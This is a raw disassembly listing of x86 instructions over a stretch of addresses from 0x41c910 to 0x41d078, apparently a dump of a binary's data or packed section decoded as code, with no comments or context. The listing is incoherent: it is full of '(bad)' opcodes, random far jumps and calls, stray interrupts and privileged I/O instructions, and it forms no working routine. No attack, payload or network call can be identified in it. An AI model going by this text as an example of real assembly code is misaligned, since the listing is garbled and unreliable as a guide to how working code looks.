  41c910:	test   esp,0x9af374fc
  41c916:	stc    
  41c917:	mov    DWORD PTR [esi-0x36],ebp
  41c91a:	jne    0x41c8fe
  41c91c:	lahf   
  41c91d:	cs (bad) 
  41c91f:	mov    edi,0x28fd7c53
  41c924:	retf   0x4cd9
  41c927:	loope  0x41c90c
  41c929:	pop    ebx
  41c92a:	(bad)  
  41c92b:	int3   
  41c92c:	popf   
  41c92d:	add    al,ch
  41c92f:	test   eax,0x4437521c
  41c934:	aam    0x21
  41c936:	mov    al,0x65
  41c938:	or     ebp,DWORD PTR [esi-0x4e47b5cc]
  41c93e:	clc    
  41c93f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c941:	sbb    eax,0x58e3d739
  41c946:	dec    esp
  41c947:	outs   dx,BYTE PTR ds:[esi]
  41c948:	sbb    edx,eax
  41c94a:	(bad)  
  41c94b:	(bad)  [ebx]
  41c94d:	xchg   bl,dh
  41c94f:	sbb    bl,ah
  41c951:	ja     0x41c9c1
  41c953:	pop    ebp
  41c954:	adc    al,0xb
  41c956:	xor    BYTE PTR [ebp+eiz*4-0x7f77c3b8],dl
  41c95d:	mov    esp,0xce85fd9
  41c962:	add    BYTE PTR [edx-0xf],dl
  41c965:	xor    BYTE PTR [esi],bl
  41c967:	test   al,0xab
  41c969:	aas    
  41c96a:	jns    0x41c8f9
  41c96c:	inc    ecx
  41c96d:	mov    ebx,0x57ced4b4
  41c972:	repnz pop ebp
  41c974:	mov    al,ds:0xd8d672e5
  41c979:	pop    esi
  41c97a:	lods   eax,DWORD PTR ds:[esi]
  41c97b:	(bad)
  41c97e:	cs jecxz 0x41c98b
  41c981:	jle    0x41c9f8
  41c983:	les    esi,FWORD PTR ds:0x42961d43
  41c989:	daa    
  41c98a:	int    0x38
  41c98c:	les    edi,FWORD PTR [ecx+0x6e5d5e45]
  41c992:	lea    ecx,[edx+0x46]
  41c995:	xor    DWORD PTR [eax-0xd],0x5af4b949
  41c99c:	loope  0x41c9a3
  41c99e:	sbb    DWORD PTR ds:0x3ea0235e,ebx
  41c9a4:	js     0x41c9cf
  41c9a6:	js     0x41c973
  41c9a8:	and    al,ah
  41c9aa:	add    edi,edi
  41c9ac:	int    0x49
  41c9ae:	add    eax,DWORD PTR [ebp-0x49]
  41c9b1:	out    0xe5,eax
  41c9b3:	push   ebx
  41c9b4:	jmp    0x2fdb:0x6de9c9ea
  41c9bb:	sbb    BYTE PTR ds:0x30fef1fb,ch
  41c9c1:	mov    DWORD PTR [ecx+edx*4+0x7e],esp
  41c9c5:	or     al,0x13
  41c9c7:	ss mov dh,0xde
  41c9ca:	pop    ds
  41c9cb:	xchg   esi,eax
  41c9cc:	pop    esi
  41c9cd:	and    dh,bl
  41c9cf:	jmp    0x42b24083
  41c9d4:	xor    al,0xbf
  41c9d6:	xchg   edx,edi
  41c9d8:	aaa    
  41c9d9:	repnz aas 
  41c9db:	sar    ah,0x1
  41c9de:	lock or DWORD PTR [ecx+0x1d],edi
  41c9e2:	mov    edx,0x31a86d40
  41c9e7:	add    ebx,DWORD PTR ds:0xa9d1faf7
  41c9ed:	and    DWORD PTR [ebx+0x79],ebp
  41c9f0:	enter  0xab82,0x12
  41c9f4:	int    0x69
  41c9f6:	sub    dh,BYTE PTR [eax]
  41c9f8:	stos   DWORD PTR es:[edi],eax
  41c9f9:	cmp    dh,BYTE PTR [edx-0x21]
  41c9fc:	push   cs
  41c9fd:	xchg   ecx,eax
  41c9fe:	cli    
  41c9ff:	ret    
  41ca00:	pop    eax
  41ca01:	aam    0x46
  41ca03:	test   al,0xff
  41ca05:	daa    
  41ca06:	jnp    0x41c9ef
  41ca08:	and    eax,DWORD PTR [ebp-0x1ec9dcbb]
  41ca0e:	pop    ebp
  41ca0f:	scas   al,BYTE PTR es:[edi]
  41ca10:	jo     0x41ca59
  41ca12:	sub    eax,0x76a10871
  41ca17:	pop    edi
  41ca18:	inc    eax
  41ca19:	xor    bh,BYTE PTR [esi+esi*1-0x4d]
  41ca1d:	xchg   esi,eax
  41ca1e:	(bad)  
  41ca20:	shl    BYTE PTR [edi],0x56
  41ca23:	shl    BYTE PTR [ebx],1
  41ca25:	and    edi,DWORD PTR [ebx+eiz*1+0x26]
  41ca29:	je     0x41ca5b
  41ca2b:	jmp    DWORD PTR [esi+ebx*4]
  41ca2e:	in     eax,0xb4
  41ca30:	mov    ds:0x7c372576,eax
  41ca35:	xor    ah,bl
  41ca37:	push   edx
  41ca38:	cdq    
  41ca39:	cmp    ah,BYTE PTR [ebp-0x172df288]
  41ca3f:	jl     0x41cab0
  41ca41:	mov    eax,0x143cfdb5
  41ca46:	xor    eax,DWORD PTR [esi-0x62]
  41ca49:	fdiv   DWORD PTR [ebp+0x2ad9fce7]
  41ca4f:	shl    esp,cl
  41ca51:	mov    ds:0x75e877b7,al
  41ca56:	pop    edx
  41ca57:	leave  
  41ca58:	push   0x53
  41ca5a:	mov    bh,0x60
  41ca5c:	pop    ecx
  41ca5d:	es loop 0x41cad5
  41ca60:	mov    ch,0xc1
  41ca62:	and    al,0xb
  41ca64:	loope  0x41ca06
  41ca66:	inc    esi
  41ca67:	cmp    BYTE PTR cs:[ecx+edi*4-0x78],ch
  41ca6c:	lock test eax,0x8143c1e8
  41ca72:	jmp    0xa5468666
  41ca77:	sbb    bh,BYTE PTR [edi+esi*2+0xd]
  41ca7b:	scas   eax,DWORD PTR es:[edi]
  41ca7c:	xor    edx,DWORD PTR [ecx]
  41ca7e:	dec    esp
  41ca7f:	push   0x2f
  41ca81:	cmp    dl,BYTE PTR [ebp+0x5c]
  41ca84:	lock mov al,ds:0xda77e1f9
  41ca8a:	or     al,cl
  41ca8c:	(bad)  
  41ca8d:	arpl   WORD PTR [ebp+0x5],cx
  41ca90:	setle  BYTE PTR [ebp+0x53]
  41ca94:	lock rcl DWORD PTR [ebp-0x7cbfe4d8],1
  41ca9b:	jmp    0x41caa1
  41ca9d:	cmc    
  41ca9e:	or     edx,esp
  41caa0:	stos   BYTE PTR es:[edi],al
  41caa1:	(bad)  
  41caa2:	scas   eax,DWORD PTR es:[edi]
  41caa3:	sbb    BYTE PTR [eax+0xf],ch
  41caa6:	cmp    BYTE PTR [ecx-0x2fb02182],bh
  41caac:	jnp    0x41cb24
  41caae:	(bad)  
  41caaf:	retf   
  41cab0:	jge    0x41caf8
  41cab2:	imul   edx,DWORD PTR [ebx+eax*8-0x6b6e43da],0x50
  41caba:	mov    ah,0x9d
  41cabc:	std    
  41cabd:	push   edx
  41cabe:	sbb    al,0xae
  41cac0:	gs sub eax,ebx
  41cac3:	cmp    eax,0x984840e
  41cac8:	add    edi,DWORD PTR [ecx-0x15]
  41cacb:	loope  0x41ca7b
  41cacd:	add    ecx,DWORD PTR [ebp+0x77]
  41cad0:	mov    cl,0x92
  41cad2:	push   esi
  41cad3:	imul   ebx,DWORD PTR [ecx-0xe],0xffffffa1
  41cad7:	sub    al,BYTE PTR [ebp+0x526154ac]
  41cadd:	cmp    DWORD PTR [edx+0x51b8f13f],ecx
  41cae3:	add    eax,0x5ee98ad
  41cae8:	(bad)  
  41cae9:	imul   esp,DWORD PTR [eax-0x9ecd231],0xffffffe9
  41caf0:	addr16 pop ecx
  41caf2:	or     esp,eax
  41caf4:	adc    al,0x95
  41caf6:	addr16 sti 
  41caf8:	mov    eax,DWORD PTR [esi]
  41cafa:	dec    ebp
  41cafb:	xchg   edx,eax
  41cafc:	mov    WORD PTR [edx+0x47422e00],gs
  41cb02:	cwde   
  41cb03:	or     al,0x64
  41cb05:	or     edi,esi
  41cb07:	arpl   WORD PTR [edi+0x39],bx
  41cb0a:	cmp    BYTE PTR [ebx],0xf5
  41cb0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb0e:	push   es
  41cb0f:	test   eax,0xb54398a8
  41cb14:	mov    ds:0x3c9bf45c,al
  41cb19:	inc    eax
  41cb1a:	jns    0x41cb06
  41cb1c:	jb     0x41cb6e
  41cb1e:	ds (bad) 
  41cb21:	pushf  
  41cb22:	xchg   ebx,eax
  41cb23:	mov    cl,BYTE PTR [ebx]
  41cb25:	mov    dh,0x7e
  41cb27:	jg     0x41cb7f
  41cb29:	jge    0x41cb97
  41cb2b:	inc    edx
  41cb2c:	aam    0xf9
  41cb2e:	mov    eax,0x2e7eabaf
  41cb33:	sbb    al,0x56
  41cb35:	fnsave [edx+0x6c]
  41cb38:	dec    esi
  41cb39:	push   esp
  41cb3a:	xchg   ebx,eax
  41cb3b:	jmp    0x981b9070
  41cb40:	mov    dh,0xf
  41cb42:	outs   dx,BYTE PTR ds:[esi]
  41cb43:	sub    BYTE PTR [ecx+0x1c],ah
  41cb46:	outs   dx,DWORD PTR ds:[esi]
  41cb47:	rcr    BYTE PTR [ebx-0xd],0xf2
  41cb4b:	cmp    ebp,ecx
  41cb4d:	mov    WORD PTR [ecx+0x66],ds
  41cb50:	repz mov dh,0x50
  41cb53:	lods   eax,DWORD PTR ds:[esi]
  41cb54:	js     0x41cb4c
  41cb56:	sub    ah,BYTE PTR [edx-0x6a0fa649]
  41cb5c:	retf   
  41cb5d:	mov    eax,0xf4fc06ef
  41cb62:	mov    cl,0xb2
  41cb64:	mov    ebp,DWORD PTR [esi-0x4724b0ba]
  41cb6a:	jecxz  0x41cb1d
  41cb6c:	je     0x41cb76
  41cb6e:	jne    0x41cb73
  41cb70:	cmc    
  41cb71:	adc    DWORD PTR [edx],esp
  41cb73:	sub    ecx,DWORD PTR [edx+0x78]
  41cb76:	xor    bl,cl
  41cb78:	mov    eax,0x9b3c78d0
  41cb7d:	int    0xfe
  41cb7f:	test   eax,0x849d1d79
  41cb84:	cmp    DWORD PTR [esp+esi*4],0x4904e3e0
  41cb8b:	or     DWORD PTR [esi],esp
  41cb8d:	aaa    
  41cb8e:	leave  
  41cb8f:	mov    ebp,0x29299a6d
  41cb94:	pop    es
  41cb95:	icebp  
  41cb96:	leave  
  41cb97:	out    0xf0,al
  41cb99:	pop    eax
  41cb9a:	inc    eax
  41cb9b:	pop    edi
  41cb9c:	cmp    al,0x26
  41cb9e:	fist   WORD PTR [edi+0x38]
  41cba1:	xchg   edi,eax
  41cba2:	fwait
  41cba3:	aaa    
  41cba4:	rcr    BYTE PTR [ebx],1
  41cba6:	test   eax,0x671f9ee4
  41cbab:	pop    ss
  41cbac:	inc    ebp
  41cbad:	inc    esp
  41cbae:	(bad)  
  41cbaf:	cdq    
  41cbb0:	adc    dh,BYTE PTR [esi-0x15]
  41cbb3:	loopne 0x41cb9a
  41cbb5:	mov    edx,0xa115404a
  41cbba:	xor    al,0x29
  41cbbc:	add    bl,dl
  41cbbe:	mov    WORD PTR [ecx],?
  41cbc0:	mov    ah,0x4b
  41cbc2:	push   eax
  41cbc3:	pop    es
  41cbc4:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41cbc6:	mov    al,0xd9
  41cbc8:	in     eax,dx
  41cbc9:	sub    al,0xa
  41cbcb:	push   0xab090212
  41cbd0:	cli    
  41cbd1:	jg     0x41cc40
  41cbd3:	or     eax,0xa045aa41
  41cbd8:	fs ja  0x41cc22
  41cbdb:	scas   eax,DWORD PTR es:[edi]
  41cbdc:	dec    ecx
  41cbdd:	outs   dx,DWORD PTR ds:[esi]
  41cbde:	ss pop ecx
  41cbe0:	add    BYTE PTR [ecx+0x29de112a],dl
  41cbe6:	and    al,0x15
  41cbe8:	jmp    0x2e93:0x5ce8b0d6
  41cbef:	add    al,BYTE PTR [esi+eiz*8]
  41cbf2:	push   0xffffffca
  41cbf4:	ror    BYTE PTR [edi-0x67726e9],1
  41cbfa:	mov    cl,0x48
  41cbfc:	sub    DWORD PTR [esi+0x66],ecx
  41cbff:	sub    eax,0x124bdf97
  41cc04:	in     al,0xd7
  41cc06:	inc    ebp
  41cc07:	mov    al,ds:0x40feffe
  41cc0c:	add    eax,0xb23503d7
  41cc11:	mov    esp,edi
  41cc13:	fistp  DWORD PTR [ebx+0x6f1401d6]
  41cc19:	xor    DWORD PTR [ecx+ebx*8-0x3b10235b],ecx
  41cc20:	dec    eax
  41cc21:	inc    ebx
  41cc22:	push   cs
  41cc23:	mov    al,ds:0x84d67969
  41cc28:	dec    esi
  41cc29:	mov    al,BYTE PTR [ecx]
  41cc2b:	or     DWORD PTR [eax+0x4791ae00],edx
  41cc31:	(bad)  
  41cc32:	push   0x1b8ce04e
  41cc37:	test   DWORD PTR [esi-0x45],0xf1608cbc
  41cc3e:	mov    WORD PTR [ecx+0x7cb90068],?
  41cc44:	push   eax
  41cc45:	jmp    0x608d9fa
  41cc4a:	pop    es
  41cc4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc4c:	xchg   ebp,eax
  41cc4d:	out    0xde,eax
  41cc4f:	xor    bl,al
  41cc51:	cmp    BYTE PTR [edi],bl
  41cc53:	mov    ch,0xe7
  41cc55:	dec    ecx
  41cc56:	outs   dx,DWORD PTR ds:[esi]
  41cc57:	adc    DWORD PTR [eax],esp
  41cc59:	or     eax,0xbf213323
  41cc5e:	adc    DWORD PTR [eax],edi
  41cc60:	rcr    esi,cl
  41cc62:	mov    ah,0x52
  41cc64:	popa   
  41cc65:	mov    ecx,0xbf2d3108
  41cc6a:	xchg   BYTE PTR [edi+0x75],bl
  41cc6d:	jmp    0x2035:0xef48d0e6
  41cc74:	clc    
  41cc75:	nop
  41cc76:	mov    cl,0x4
  41cc78:	sbb    eax,0xe06eb935
  41cc7d:	dec    eax
  41cc7e:	fwait
  41cc7f:	pop    edi
  41cc80:	and    bl,BYTE PTR [esi+0x67fd6413]
  41cc86:	cdq    
  41cc87:	cmp    esp,DWORD PTR [ebx]
  41cc89:	les    esp,FWORD PTR [ebx]
  41cc8b:	xlat   BYTE PTR ds:[ebx]
  41cc8c:	cmp    dl,BYTE PTR [ebx-0x5af6fd09]
  41cc92:	es cmc 
  41cc94:	dec    eax
  41cc95:	jle    0x41cc2a
  41cc97:	or     edx,DWORD PTR [edx-0x3b]
  41cc9a:	sti    
  41cc9b:	and    ch,dh
  41cc9d:	jge    0x41ccd2
  41cc9f:	fist   WORD PTR [ecx+ecx*2-0x80]
  41cca3:	arpl   WORD PTR [eax],dx
  41cca5:	pop    cx
  41cca7:	(bad)  
  41cca9:	or     edi,DWORD PTR [edi-0x74]
  41ccac:	in     al,dx
  41ccad:	(bad)  
  41ccae:	in     eax,0xeb
  41ccb0:	dec    esp
  41ccb1:	xor    DWORD PTR [ecx-0x2d288201],esp
  41ccb7:	ror    BYTE PTR [eax+ebp*2-0x75],1
  41ccbb:	adc    edi,DWORD PTR [ecx]
  41ccbd:	ror    BYTE PTR [ecx],1
  41ccbf:	outs   dx,BYTE PTR ds:[esi]
  41ccc0:	pop    esi
  41ccc1:	mov    bl,0x8
  41ccc3:	cmp    bh,dh
  41ccc5:	retf   
  41ccc6:	sub    eax,0x430f3a1
  41cccb:	addr16 test eax,0x7f691ae6
  41ccd1:	and    cl,BYTE PTR [esi-0x4e]
  41ccd4:	fsub   st,st(4)
  41ccd6:	stos   DWORD PTR es:[edi],eax
  41ccd7:	or     eax,ebp
  41ccd9:	call   0x47f1:0xf781958d
  41cce0:	and    BYTE PTR [ebx+ebp*1],bl
  41cce3:	mov    ah,0xd4
  41cce5:	or     eax,0xd3aefb54
  41ccea:	mov    ch,0xc2
  41ccec:	call   0x49b6:0xe66c7f83
  41ccf3:	or     BYTE PTR [ebx-0x58748b04],ah
  41ccf9:	sbb    eax,0xa1fdb5df
  41ccfe:	sbb    eax,0x7c0165f8
  41cd03:	pop    ss
  41cd04:	push   ebx
  41cd05:	ds stos DWORD PTR es:[edi],eax
  41cd07:	fistp  DWORD PTR [edx]
  41cd09:	dec    esp
  41cd0a:	fadd   QWORD PTR [edx]
  41cd0c:	jg     0x41cd1f
  41cd0e:	mov    ds:0xbd630a87,al
  41cd13:	mov    ah,0x7d
  41cd15:	test   eax,0x530676f4
  41cd1a:	js     0x41cd37
  41cd1c:	jns    0x41cd66
  41cd1e:	mov    cl,0x52
  41cd20:	shl    BYTE PTR [edi-0x7be5ed97],1
  41cd26:	pop    eax
  41cd27:	xchg   edi,eax
  41cd28:	cmp    DWORD PTR [edi+ebp*2-0x8],edi
  41cd2c:	outs   dx,BYTE PTR ss:[esi]
  41cd2e:	scas   al,BYTE PTR es:[edi]
  41cd2f:	nop
  41cd30:	sbb    bl,ah
  41cd32:	imul   esi,DWORD PTR [edx-0x1e3fe943],0xae7fb2e3
  41cd3c:	mov    ecx,0x7798beb8
  41cd41:	push   eax
  41cd42:	dec    edi
  41cd43:	repz in eax,dx
  41cd45:	es jp  0x41cd9c
  41cd48:	mov    esi,0xc5489dd4
  41cd4d:	xor    al,0xd1
  41cd4f:	cmp    cl,BYTE PTR [ebx]
  41cd51:	xchg   esi,eax
  41cd52:	fstp   TBYTE PTR [ebp+0xf996616]
  41cd58:	cli    
  41cd59:	ss push ebp
  41cd5b:	lods   eax,DWORD PTR ds:[esi]
  41cd5c:	cmp    dl,ah
  41cd5e:	mov    dh,0x18
  41cd60:	cmp    DWORD PTR [esi-0x2f],esi
  41cd63:	pop    ecx
  41cd64:	jle    0x41cd05
  41cd66:	pop    edi
  41cd67:	mov    bl,0x62
  41cd69:	mov    eax,ds:0xbdbb6144
  41cd6e:	jmp    0x1690:0x511f8c1d
  41cd75:	add    BYTE PTR [edi+0x5cad197f],ah
  41cd7b:	js     0x41cd5f
  41cd7d:	outs   dx,BYTE PTR ds:[esi]
  41cd7e:	test   al,0x4e
  41cd80:	mov    esi,0xd647dbe5
  41cd85:	mov    dh,0x2d
  41cd87:	pop    ds
  41cd88:	adc    al,0xf7
  41cd8a:	(bad)  
  41cd8b:	mov    ah,0x6a
  41cd8d:	(bad)  
  41cd8e:	cld    
  41cd8f:	push   esp
  41cd90:	push   ss
  41cd91:	and    dl,BYTE PTR [edx-0x2c3c627a]
  41cd97:	sbb    ecx,ebx
  41cd99:	jge    0x41cd2b
  41cd9b:	mov    bh,0xec
  41cd9d:	lahf   
  41cd9e:	hlt    
  41cd9f:	sub    DWORD PTR [edx+edx*1-0x225ca9f6],ebx
  41cda6:	cdq    
  41cda7:	outs   dx,DWORD PTR ds:[esi]
  41cda8:	enter  0x3809,0xf2
  41cdac:	div    bh
  41cdae:	test   DWORD PTR ds:0x923f8330,0x3ca83c61
  41cdb8:	push   eax
  41cdb9:	mov    dh,0x7a
  41cdbb:	mov    ecx,0x996a32fc
  41cdc0:	inc    ebx
  41cdc1:	xor    al,0x70
  41cdc3:	cmp    cl,BYTE PTR [ebx-0x35541355]
  41cdc9:	shl    DWORD PTR [ecx-0x39],0xb8
  41cdcd:	lock pop esi
  41cdcf:	popa   
  41cdd0:	cmc    
  41cdd1:	or     al,BYTE PTR [eax+0x1312959a]
  41cdd7:	std    
  41cdd8:	mov    dl,0xd8
  41cdda:	(bad)  
  41cddb:	push   DWORD PTR [esi+0x69]
  41cdde:	jecxz  0x41cd94
  41cde0:	mov    bh,0x36
  41cde2:	mov    ebx,?
  41cde4:	mov    al,0x4a
  41cde6:	dec    ebx
  41cde7:	add    BYTE PTR [ecx+0x23],dl
  41cdea:	call   edx
  41cdec:	gs mov bl,0x67
  41cdef:	in     eax,dx
  41cdf0:	test   al,0xd2
  41cdf2:	jp     0x41ce0d
  41cdf4:	pusha  
  41cdf5:	pop    ecx
  41cdf6:	addr16 repnz retf 0xf236
  41cdfb:	fs mov ch,0xbb
  41cdfe:	stos   BYTE PTR es:[edi],al
  41cdff:	sar    BYTE PTR [edi+0x0],cl
  41ce02:	sbb    bl,BYTE PTR [edx+edx*4]
  41ce05:	stos   BYTE PTR es:[edi],al
  41ce06:	mov    ebp,0xc7ac487b
  41ce0b:	push   ebp
  41ce0c:	loop   0x41ce24
  41ce0e:	sub    eax,0x54088946
  41ce13:	cmp    DWORD PTR [esp+edi*1],esp
  41ce16:	add    esi,eax
  41ce18:	mov    DWORD PTR [ebx-0x43],ebp
  41ce1b:	and    al,0x74
  41ce1d:	arpl   WORD PTR [ecx+0x1564e882],cx
  41ce23:	add    al,0x69
  41ce25:	das    
  41ce26:	mov    cl,0xda
  41ce28:	mov    eax,ds:0x787130e5
  41ce2d:	pop    esp
  41ce2e:	cdq    
  41ce2f:	dec    edx
  41ce30:	pop    esp
  41ce31:	and    al,0x74
  41ce33:	jnp    0x41ce32
  41ce35:	xlat   BYTE PTR ds:[ebx]
  41ce36:	daa    
  41ce37:	(bad)  
  41ce3b:	aaa    
  41ce3c:	pop    esp
  41ce3d:	inc    eax
  41ce3e:	mov    esp,0x28013ae0
  41ce43:	mov    ecx,0xe5bb9b92
  41ce48:	les    ecx,FWORD PTR [eax]
  41ce4a:	jns    0x41ce53
  41ce4c:	outs   dx,DWORD PTR ds:[esi]
  41ce4d:	leave  
  41ce4e:	imul   ecx,ebp,0x6c
  41ce51:	aad    0x5c
  41ce53:	or     edi,DWORD PTR [ebp-0x66]
  41ce56:	push   0xffffffc5
  41ce58:	pop    ds
  41ce59:	fidivr WORD PTR [esi+0x28]
  41ce5c:	dec    esi
  41ce5d:	in     eax,0x3f
  41ce5f:	cmp    dh,BYTE PTR [ebp+edi*1+0x15]
  41ce63:	mov    ch,0xc9
  41ce65:	(bad)  
  41ce66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce67:	into   
  41ce68:	dec    ecx
  41ce69:	xchg   esi,eax
  41ce6a:	adc    al,0x1e
  41ce6c:	mov    bl,0x7a
  41ce6e:	xchg   ebp,eax
  41ce6f:	inc    esp
  41ce70:	lods   al,BYTE PTR ds:[esi]
  41ce71:	mov    WORD PTR ss:[eax+eiz*2+0x2b],fs
  41ce76:	loope  0x41cedf
  41ce78:	jne    0x41ce07
  41ce7a:	ja     0x41ce26
  41ce7c:	fcom   QWORD PTR [ebx-0x2c]
  41ce7f:	cdq    
  41ce80:	cmp    eax,0xa0aeec14
  41ce85:	fnstsw WORD PTR ds:0x8c2c6ac7
  41ce8b:	push   ebp
  41ce8c:	in     al,0xeb
  41ce8e:	ret    0xf5c2
  41ce91:	push   edi
  41ce92:	sbb    BYTE PTR [eax+ebx*8-0x5d8e862f],0x82
  41ce9a:	xchg   ebx,eax
  41ce9b:	(bad)  
  41ce9d:	aad    0xab
  41ce9f:	inc    ebp
  41cea0:	inc    edx
  41cea1:	in     eax,dx
  41cea2:	sub    eax,0xe6b4826d
  41cea7:	xchg   esi,eax
  41cea8:	in     al,dx
  41cea9:	pop    esp
  41ceaa:	ja     0xd473231e
  41ceb0:	ret    
  41ceb1:	dec    edx
  41ceb2:	(bad)  
  41ceb3:	push   esp
  41ceb4:	neg    BYTE PTR [ebx+edx*8+0x5a]
  41ceb8:	outs   dx,DWORD PTR ds:[esi]
  41ceb9:	xchg   ecx,eax
  41ceba:	or     BYTE PTR [ebp-0x23],0x8a
  41cebe:	(bad)  
  41cebf:	pusha  
  41cec0:	inc    eax
  41cec1:	into   
  41cec2:	push   esi
  41cec3:	loope  0x41ce95
  41cec5:	pop    esp
  41cec6:	mov    WORD PTR [esi-0xe],ds
  41cec9:	pop    esi
  41ceca:	call   0xf4fb:0x74c74110
  41ced1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ced2:	pop    eax
  41ced3:	bound  esi,QWORD PTR [esi]
  41ced5:	sub    al,0x49
  41ced7:	pop    edx
  41ced8:	or     BYTE PTR [edi],bh
  41ceda:	push   cs
  41cedb:	cld    
  41cedc:	(bad)  
  41cedd:	dec    esp
  41cede:	imul   edi,DWORD PTR [edx]
  41cee1:	inc    eax
  41cee2:	repz (bad) [ebp-0x3c2ecd0b]
  41cee9:	es push edx
  41ceeb:	call   0x8a82:0x4ed888bb
  41cef2:	cmp    DWORD PTR [eax-0x52],0x76cd9052
  41cef9:	div    BYTE PTR [edi+0x9]
  41cefc:	mov    ds:0xd1025930,eax
  41cf01:	loopne 0x41cf0c
  41cf03:	fidivr DWORD PTR [esi-0x24044360]
  41cf09:	xchg   ebx,eax
  41cf0a:	add    al,0xc3
  41cf0c:	cwde   
  41cf0d:	dec    ebx
  41cf0e:	cmp    eax,esp
  41cf10:	push   ebp
  41cf11:	inc    esi
  41cf12:	int    0x12
  41cf14:	dec    eax
  41cf15:	or     BYTE PTR [ecx],dl
  41cf17:	rol    BYTE PTR [ebx-0x20],0x7c
  41cf1b:	pop    eax
  41cf1c:	push   0x12
  41cf1e:	sbb    eax,0x14ba9ba
  41cf23:	jg     0x41cf89
  41cf25:	jg     0x41cf1e
  41cf27:	or     eax,0x7b506ad5
  41cf2c:	out    0x17,al
  41cf2e:	jmp    FWORD PTR [esi]
  41cf30:	cmp    cl,bl
  41cf32:	fldcw  WORD PTR [ebx]
  41cf34:	cmp    ch,BYTE PTR [ebx+0x3c]
  41cf37:	pop    edi
  41cf38:	mov    DWORD PTR [edx+0x16],esi
  41cf3b:	jle    0x41cf40
  41cf3d:	call   0x983:0xd8b06436
  41cf44:	lea    ebp,[ebp-0x5f6c562a]
  41cf4a:	xchg   BYTE PTR [edx],al
  41cf4c:	jne    0x41cefe
  41cf4e:	xchg   ebx,eax
  41cf4f:	and    edi,DWORD PTR [esi+ebp*1-0x11b7c1b3]
  41cf56:	or     BYTE PTR [eax+0x46dd71f9],dh
  41cf5c:	je     0x41cf39
  41cf5e:	cmc    
  41cf5f:	dec    edx
  41cf60:	xchg   ecx,eax
  41cf61:	repnz lds esp,FWORD PTR [ecx+eax*8+0x7b]
  41cf66:	sub    eax,0x8eacfd71
  41cf6b:	std    
  41cf6c:	frstor [eax]
  41cf6e:	ins    DWORD PTR es:[edi],dx
  41cf6f:	mov    eax,0xe9abc07a
  41cf74:	xchg   edi,eax
  41cf75:	sub    dh,BYTE PTR [eax]
  41cf77:	icebp  
  41cf78:	adc    eax,0x8fd089c1
  41cf7d:	and    eax,ecx
  41cf7f:	loopne 0x41cfc1
  41cf81:	cmp    eax,DWORD PTR [esi]
  41cf83:	fsubr  QWORD PTR [edx+0x714c83c2]
  41cf89:	pop    edx
  41cf8a:	int3   
  41cf8b:	mov    ch,0xcc
  41cf8d:	iret   
  41cf8e:	dec    edi
  41cf8f:	jmp    0xe8dc:0x87886dac
  41cf96:	ror    DWORD PTR [esi],cl
  41cf98:	jecxz  0x41cfc4
  41cf9a:	sti    
  41cf9b:	bound  edx,QWORD PTR [ecx]
  41cf9d:	int    0xe3
  41cf9f:	outs   dx,BYTE PTR ds:[esi]
  41cfa0:	dec    ebp
  41cfa1:	push   ds
  41cfa2:	lock mul BYTE PTR [eax-0x5062e728]
  41cfa9:	mov    ds:0x4a7609f1,al
  41cfae:	and    al,0xf3
  41cfb0:	imul   edi,esp,0xffffffdf
  41cfb3:	sub    DWORD PTR [ebp+0x666ef6ec],esi
  41cfb9:	pop    esi
  41cfba:	dec    esi
  41cfbb:	stos   DWORD PTR es:[edi],eax
  41cfbc:	push   edi
  41cfbd:	adc    eax,0x61e9139a
  41cfc2:	sti    
  41cfc3:	fwait
  41cfc4:	push   ebp
  41cfc5:	add    ah,BYTE PTR [esi]
  41cfc7:	xchg   dh,cl
  41cfc9:	xchg   esp,eax
  41cfca:	push   esp
  41cfcb:	inc    edx
  41cfcc:	(bad)  
  41cfcd:	stos   DWORD PTR es:[edi],eax
  41cfce:	pop    es
  41cfcf:	push   ss
  41cfd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfd1:	mov    al,ds:0x3cb39483
  41cfd6:	push   0xa90e68a2
  41cfdb:	int    0xc2
  41cfdd:	add    bh,BYTE PTR ds:0xbf5bbb00
  41cfe3:	gs ds pusha 
  41cfe6:	adc    edi,DWORD PTR [eax+0x11]
  41cfe9:	jne    0x41cfab
  41cfeb:	enter  0xfb95,0xf0
  41cfef:	sbb    ecx,0xffffffbd
  41cff2:	leave  
  41cff3:	and    DWORD PTR [ecx-0x71bc13f5],ecx
  41cff9:	int3   
  41cffa:	xchg   edi,eax
  41cffb:	fwait
  41cffc:	test   bh,0x68
  41cfff:	repz cmp eax,0xc55a7c43
  41d005:	stos   DWORD PTR es:[edi],eax
  41d006:	push   0xe222606f
  41d00b:	imul   esi,edx,0xffffffde
  41d00e:	loope  0x41d089
  41d010:	gs popa 
  41d012:	dec    esi
  41d013:	xchg   ecx,eax
  41d014:	jl     0x41cfae
  41d016:	xor    BYTE PTR [edi+0x33],dl
  41d019:	rol    DWORD PTR [eax],0x32
  41d01c:	jb     0x41d092
  41d01e:	sbb    al,0x6b
  41d020:	mov    cs,WORD PTR [edx]
  41d022:	sbb    edi,DWORD PTR [edi+eax*8]
  41d025:	xchg   ebx,eax
  41d026:	leave  
  41d027:	jmp    0x41cfb8
  41d029:	jge    0x41d013
  41d02b:	data16 js 0x41d04a
  41d02e:	nop
  41d02f:	das    
  41d030:	mov    ecx,0x926a4646
  41d035:	xor    al,0xfe
  41d037:	mov    edx,0x96b3943c
  41d03c:	inc    edi
  41d03d:	out    dx,al
  41d03e:	mov    al,0xba
  41d040:	int    0xb8
  41d042:	cdq    
  41d043:	jmp    0x5ced:0x9e1997c2
  41d04a:	in     eax,0xbc
  41d04c:	or     edx,edx
  41d04e:	bound  ebx,QWORD PTR [bp+di+0x2fab]
  41d053:	jge    0x41d09f
  41d055:	ds push esp
  41d057:	mov    edi,0x4e893777
  41d05c:	fs dec esp
  41d05e:	in     eax,0xcb
  41d060:	add    eax,0x5539d6de
  41d065:	xor    al,BYTE PTR [edx+edi*4]
  41d068:	aas    
  41d069:	data16 and bh,BYTE PTR [esi-0x61]
  41d06d:	call   0x452e0a22
  41d072:	xor    esi,ebx
  41d074:	lods   eax,DWORD PTR ds:[esi]
  41d075:	sub    ah,BYTE PTR [edx]
  41d077:	push   ebx
  41d078:	pop    esp
